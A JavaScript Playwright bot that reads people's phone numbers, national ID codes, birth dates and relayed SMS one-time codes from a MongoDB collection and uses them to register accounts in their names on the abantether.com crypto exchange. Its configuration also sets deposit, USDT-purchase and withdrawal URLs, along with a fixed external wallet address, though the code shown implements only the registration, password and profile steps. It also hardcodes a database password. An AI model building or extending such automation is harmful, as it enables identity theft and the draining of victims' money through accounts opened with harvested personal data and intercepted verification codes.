const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');
const fs = require('fs');

// کانفیگ دیتابیس
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
const DB_NAME = 'ZarrinApp';
const COLLECTION_NAME = 'zarinapp';

// تنظیمات ربات
const CONFIG = {
  website: {
    baseUrl: 'https://abantether.com',
    registerUrl: 'https://abantether.com/register',
    depositUrl: 'https://abantether.com/user/wallet/deposit/irt/direct',
    buyUrl: 'https://abantether.com/user/trade/fast/buy?s=USDT',
    withdrawUrl: 'https://abantether.com/user/wallet/withdrawal/crypto?symbol=USDT',
    timeout: 60000,
    headless: true, // در سرور باید true باشد
    slowMo: 100
  },
  
  transaction: {
    depositAmount: '5000000',
    withdrawAddress: 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS',
    maxRetries: 3,
    password: 'ImSorryButIhaveTo@1'
  },
  
  polling: {
    interval: 30000,
    batchSize: 5
  }
};

class AbanTetherAutoBot {
  constructor() {
    this.client = null;
    this.db = null;
    this.collection = null;
    this.isProcessing = false;
    this.activeUsers = new Set();
    this.browser = null;
    this.pollingInterval = null;
    this.currentUserPhone = null;
    this.currentStep = null;
    this.page = null;
  }

  // ==================== بخش دیتابیس ====================
  
  async connectToDatabase() {
    try {
      console.log('🔌 Connecting to MongoDB...');
      this.client = new MongoClient(MONGODB_URI, {
        serverSelectionTimeoutMS: 30000,
        connectTimeoutMS: 30000,
        maxPoolSize: 10
      });
      
      await this.client.connect();
      this.db = this.client.db(DB_NAME);
      this.collection = this.db.collection(COLLECTION_NAME);
      console.log('✅ Connected to MongoDB successfully');
      
      // تست اتصال
      const count = await this.collection.countDocuments({});
      console.log(`📊 Total documents in database: ${count}`);
      
      return true;
    } catch (error) {
      console.error('❌ MongoDB connection error:', error.message);
      return false;
    }
  }

  async getPendingUsers() {
    try {
      console.log('🔍 Checking for pending users...');
      
      // کوئری ساده برای تست
      const query = {
        $or: [
          { processed: { $exists: false } },
          { processed: false },
          { status: { $in: ['processing', 'failed', null] } }
        ]
      };

      const users = await this.collection.find(query)
        .sort({ createdAt: 1 })
        .limit(CONFIG.polling.batchSize)
        .toArray();
      
      console.log(`🎯 Found ${users.length} pending users`);
      
      if (users.length > 0) {
        console.log('\n📋 Pending Users:');
        users.forEach((user, index) => {
          console.log(`${index + 1}. ${user.personalPhoneNumber} - ${user.personalName}`);
        });
      }
      
      return users;
    } catch (error) {
      console.error('❌ Error fetching users:', error.message);
      return [];
    }
  }

  async updateUserStatus(phoneNumber, updateData) {
    try {
      const result = await this.collection.updateOne(
        { personalPhoneNumber: phoneNumber },
        {
          $set: updateData,
          $inc: { 
            retryCount: updateData.status === 'failed' ? 1 : 0
          },
          $currentDate: { lastUpdated: true }
        },
        { upsert: false }
      );
      
      console.log(`📝 Updated user ${phoneNumber}: ${updateData.status || 'updated'}`);
      return result.modifiedCount > 0;
    } catch (error) {
      console.error('❌ Error updating user:', error.message);
      return false;
    }
  }

  async markAsProcessing(phoneNumber) {
    return this.updateUserStatus(phoneNumber, {
      status: 'processing',
      startedAt: new Date(),
      lastStep: 'starting'
    });
  }

  async markAsCompleted(phoneNumber, details = {}) {
    return this.updateUserStatus(phoneNumber, {
      processed: true,
      status: 'completed',
      completedAt: new Date(),
      ...details
    });
  }

  async markAsFailed(phoneNumber, reason, step = 'unknown') {
    return this.updateUserStatus(phoneNumber, {
      status: 'failed',
      failureReason: reason,
      failedStep: step,
      failedAt: new Date()
    });
  }

  // ==================== بخش Playwright ====================

  async initializeBrowser() {
    try {
      console.log('🌐 Launching browser...');
      
      // تنظیمات مخصوص Railway/Docker
      const launchOptions = {
        headless: CONFIG.website.headless,
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--disable-gpu',
          '--window-size=1920,1080'
        ],
        slowMo: CONFIG.website.slowMo
      };
      
      // اگر در Railway هستیم، تنظیمات اضافه
      if (process.env.RAILWAY_ENVIRONMENT || process.env.NODE_ENV === 'production') {
        launchOptions.executablePath = process.env.PLAYWRIGHT_CHROME_EXECUTABLE_PATH || '/usr/bin/chromium';
        console.log('🚂 Railway environment detected');
      }
      
      this.browser = await chromium.launch(launchOptions);
      console.log('✅ Browser launched successfully');
      return true;
    } catch (error) {
      console.error('❌ Failed to launch browser:', error.message);
      return false;
    }
  }

  async createPage() {
    try {
      const context = await this.browser.newContext({
        viewport: { width: 1920, height: 1080 },
        userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        locale: 'fa-IR',
        timezoneId: 'Asia/Tehran'
      });

      this.page = await context.newPage();
      await this.page.setDefaultTimeout(CONFIG.website.timeout);
      
      console.log('✅ Page created successfully');
      return true;
    } catch (error) {
      console.error('❌ Failed to create page:', error.message);
      return false;
    }
  }

  async fillInput(page, placeholder, value) {
    try {
      console.log(`📝 Filling ${placeholder}: ${value}`);
      const selector = `input[placeholder*="${placeholder}"]`;
      await page.waitForSelector(selector, { timeout: 10000 });
      await page.fill(selector, value);
      await page.waitForTimeout(1000);
      return true;
    } catch (error) {
      console.error(`❌ Could not fill ${placeholder}`);
      return false;
    }
  }

  async clickButton(page, text) {
    try {
      console.log(`🖱️ Clicking: ${text}`);
      const selector = `button:has-text("${text}"), a:has-text("${text}")`;
      await page.waitForSelector(selector, { timeout: 10000 });
      await page.click(selector);
      await page.waitForTimeout(2000);
      return true;
    } catch (error) {
      console.log(`⚠️ Could not click ${text}, trying alternative...`);
      return false;
    }
  }

  async clickByTitle(page, title) {
    try {
      console.log(`🖱️ Clicking title: ${title}`);
      const selector = `[title="${title}"]`;
      await page.waitForSelector(selector, { timeout: 10000 });
      await page.click(selector);
      await page.waitForTimeout(2000);
      return true;
    } catch (error) {
      console.error(`❌ Could not click ${title}`);
      return false;
    }
  }

  async waitForOtp(page, fieldName) {
    console.log(`⏳ Waiting for ${fieldName}...`);
    
    const startTime = Date.now();
    const timeout = 120000;
    
    while (Date.now() - startTime < timeout) {
      try {
        const user = await this.collection.findOne({
          personalPhoneNumber: this.currentUserPhone
        });
        
        if (user && user[fieldName] && user[fieldName].length >= 4) {
          console.log(`✅ ${fieldName} received: ${user[fieldName]}`);
          return user[fieldName];
        }
        
        await page.waitForTimeout(5000);
      } catch (error) {
        await page.waitForTimeout(5000);
      }
    }
    
    return null;
  }

  // ==================== مراحل ساده‌شده ====================

  async step1_Register(page, user) {
    console.log('📝 Step 1: Registration');
    
    try {
      await page.goto(CONFIG.website.registerUrl, { 
        waitUntil: 'networkidle',
        timeout: 60000 
      });
      await page.waitForTimeout(5000);
      
      // وارد کردن شماره موبایل
      await this.fillInput(page, 'شماره موبایل', user.personalPhoneNumber);
      
      // کلیک ثبت‌نام
      await this.clickByTitle(page, 'ثبت‌نام');
      await page.waitForTimeout(5000);
      
      // اگر OTP نیاز بود
      const otp = await this.waitForOtp(page, 'otp_login');
      if (otp) {
        await this.fillInput(page, 'کد ارسال شده', otp);
        
        // سعی در کلیک روی بعد
        const clicked = await this.clickButton(page, 'بعد');
        if (!clicked) {
          console.log('ℹ️ Could not find "بعد" button, checking URL change...');
          await page.waitForTimeout(3000);
        }
      }
      
      return true;
    } catch (error) {
      console.error('❌ Error in registration:', error.message);
      throw error;
    }
  }

  async step2_Password(page) {
    console.log('🔑 Step 2: Password');
    
    try {
      await this.fillInput(page, 'رمز عبور', CONFIG.transaction.password);
      await this.clickByTitle(page, 'تایید');
      await page.waitForTimeout(5000);
      return true;
    } catch (error) {
      console.error('❌ Error in password step:', error.message);
      throw error;
    }
  }

  async step3_Profile(page, user) {
    console.log('👤 Step 3: Profile');
    
    try {
      await this.fillInput(page, 'کد ۱۰ رقمی شناسایی', user.personalNationalCode);
      
      // تاریخ تولد
      try {
        const dobSelector = 'input[placeholder="روز/ماه/سال"]';
        await page.waitForSelector(dobSelector, { timeout: 10000 });
        await page.fill(dobSelector, user.personalBirthDate);
      } catch (error) {
        console.error('⚠️ Could not set birth date');
      }
      
      await this.clickByTitle(page, 'ثبت');
      await page.waitForTimeout(5000);
      return true;
    } catch (error) {
      console.error('❌ Error in profile step:', error.message);
      throw error;
    }
  }

  async processUser(user) {
    const phoneNumber = user.personalPhoneNumber;
    this.currentUserPhone = phoneNumber;
    
    console.log(`\n🎯 PROCESSING: ${phoneNumber} - ${user.personalName}`);
    
    if (this.activeUsers.has(phoneNumber)) {
      console.log(`⏭️ Already processing`);
      return;
    }
    
    this.activeUsers.add(phoneNumber);
    
    try {
      await this.markAsProcessing(phoneNumber);
      
      const pageCreated = await this.createPage();
      if (!pageCreated) {
        throw new Error('Failed to create page');
      }
      
      // مراحل اصلی
      const steps = [
        { name: 'Register', method: () => this.step1_Register(this.page, user) },
        { name: 'Password', method: () => this.step2_Password(this.page) },
        { name: 'Profile', method: () => this.step3_Profile(this.page, user) }
      ];
      
      for (const step of steps) {
        this.currentStep = step.name;
        console.log(`\n🚀 ${step.name}...`);
        
        try {
          await step.method();
          console.log(`✅ ${step.name} completed`);
        } catch (stepError) {
          console.error(`❌ ${step.name} failed:`, stepError.message);
          throw stepError;
        }
      }
      
      console.log(`\n✅ User ${phoneNumber} processed successfully`);
      await this.markAsCompleted(phoneNumber);
      
    } catch (error) {
      console.error(`\n❌ Failed for ${phoneNumber}:`, error.message);
      await this.markAsFailed(phoneNumber, error.message, this.currentStep);
      
      // بررسی تعداد تلاش‌ها
      const userDoc = await this.collection.findOne({ personalPhoneNumber: phoneNumber });
      const retryCount = userDoc?.retryCount || 0;
      
      if (retryCount >= CONFIG.transaction.maxRetries) {
        console.log(`⛔ Maximum retries reached for ${phoneNumber}`);
      }
      
    } finally {
      if (this.page) {
        try {
          await this.page.close();
        } catch (error) {
          console.error('Error closing page:', error.message);
        }
        this.page = null;
      }
      
      this.activeUsers.delete(phoneNumber);
      this.currentUserPhone = null;
      this.currentStep = null;
      
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  // ==================== مدیریت اصلی ====================

  async startPolling() {
    console.log('🔄 Polling started (30s interval)');
    
    this.pollingInterval = setInterval(async () => {
      if (this.isProcessing) {
        return;
      }
      
      this.isProcessing = true;
      
      try {
        const users = await this.getPendingUsers();
        
        if (users.length === 0) {
          console.log('😴 No pending users');
          this.isProcessing = false;
          return;
        }
        
        console.log(`👥 Found ${users.length} users to process`);
        
        for (const user of users) {
          if (this.activeUsers.size >= 1) {
            break;
          }
          
          this.processUser(user).catch(error => {
            console.error('Process error:', error);
          });
          
          await new Promise(resolve => setTimeout(resolve, 3000));
        }
      } catch (error) {
        console.error('Polling error:', error);
      } finally {
        this.isProcessing = false;
      }
    }, CONFIG.polling.interval);
  }

  async start() {
    console.log('🚀 AbanTether Bot Starting...');
    console.log('📅', new Date().toLocaleString('fa-IR'));
    console.log('⚙️  Headless mode:', CONFIG.website.headless);
    
    // اتصال به دیتابیس
    const dbConnected = await this.connectToDatabase();
    if (!dbConnected) {
      console.error('❌ Database connection failed');
      process.exit(1);
    }
    
    // راه‌اندازی مرورگر
    const browserReady = await this.initializeBrowser();
    if (!browserReady) {
      console.error('❌ Browser failed to launch');
      process.exit(1);
    }
    
    // شروع پولینگ
    await this.startPolling();
    
    // مدیریت سیگنال‌ها
    process.on('SIGINT', () => this.shutdown());
    process.on('SIGTERM', () => this.shutdown());
    
    console.log('\n✅ Bot is running');
    console.log('⏰ Checking every 30 seconds');
  }

  async shutdown() {
    console.log('\n🛑 Shutting down...');
    
    if (this.pollingInterval) {
      clearInterval(this.pollingInterval);
    }
    
    if (this.browser) {
      await this.browser.close();
    }
    
    if (this.client) {
      await this.client.close();
    }
    
    console.log('👋 Goodbye');
    process.exit(0);
  }
}

// اجرا
if (require.main === module) {
  const bot = new AbanTetherAutoBot();
  
  process.on('uncaughtException', (error) => {
    console.error('🔥 Uncaught:', error.message);
  });
  
  process.on('unhandledRejection', (reason) => {
    console.error('🔥 Unhandled rejection:', reason);
  });
  
  bot.start().catch(error => {
    console.error('Start failed:', error);
    process.exit(1);
  });
}

module.exports = AbanTetherAutoBot;